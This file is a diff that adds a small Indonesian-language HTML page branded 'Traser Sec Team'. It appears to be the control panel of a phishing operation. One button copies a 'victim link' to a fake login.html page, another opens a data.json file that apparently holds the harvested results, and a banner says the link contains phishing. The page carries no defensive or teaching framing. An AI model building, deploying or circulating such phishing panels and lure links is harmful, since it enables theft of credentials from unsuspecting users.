@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Interface</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+  <link rel="stylesheet" href="https://cdn.prinsh.com/NathanPrinsley-textstyle/nprinsh-stext.css"/>
+  <style>
+    body {
+      background-color: #0a0a0a;
+      color: #e0e0e0;
+      font-family: 'Courier New', monospace;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 40px;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+
+   
+
+    .button-container {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+      width: 300px;
+      margin-bottom: 30px;
+    }
+
+    a.button {
+      background-color: #1a1a1a;
+      color: #ffffff;
+      text-decoration: none;
+      padding: 15px;
+      text-align: center;
+      border: 1px solid #444;
+      border-radius: 5px;
+      transition: background-color 0.3s ease;
+    }
+
+    a.button:hover {
+      background-color: #222;
+      border-color: #777;
+    }
+
+    .comment-section {
+      width: 90%;
+      max-width: 400px;
+      background: #111;
+      border: 1px solid #333;
+      padding: 15px;
+      margin-top: 10px;
+    }
+
+    .comment-section textarea {
+      width: 93%;
+      background: #000;
+      border: 1px solid #444;
+      color: #fff;
+      padding: 10px;
+      resize: none;
+    }
+
+    .comment-section button {
+      margin-top: 10px;
+      padding: 10px;
+      width: 100%;
+      background-color: #1a1a1a;
+      color: white;
+      border: 1px solid #444;
+      cursor: pointer;
+    }
+
+    .comment {
+      background: #000;
+      padding: 10px;
+      margin-top: 10px;
+      border: 1px solid #222;
+      font-size: 13px;
+    }
+
+    footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <h1 class="nprinsleyy nprinsley-text-rainbowan">Traser Sec Team</h1>
+  <div class="button-container">
+    <a href="https://module-traser.is-great.net/data.json" class="button">Untuk melihat</a>
+   <a href="#" class="button" onclick="navigator.clipboard.writeText('https://module-traser.is-great.net/login.html'); alert('succes')">Salin Link korban</a>
+   <p>PERINGATAN! LINK MENGANDUNG PISHING!</p>
+</body>
+</html>
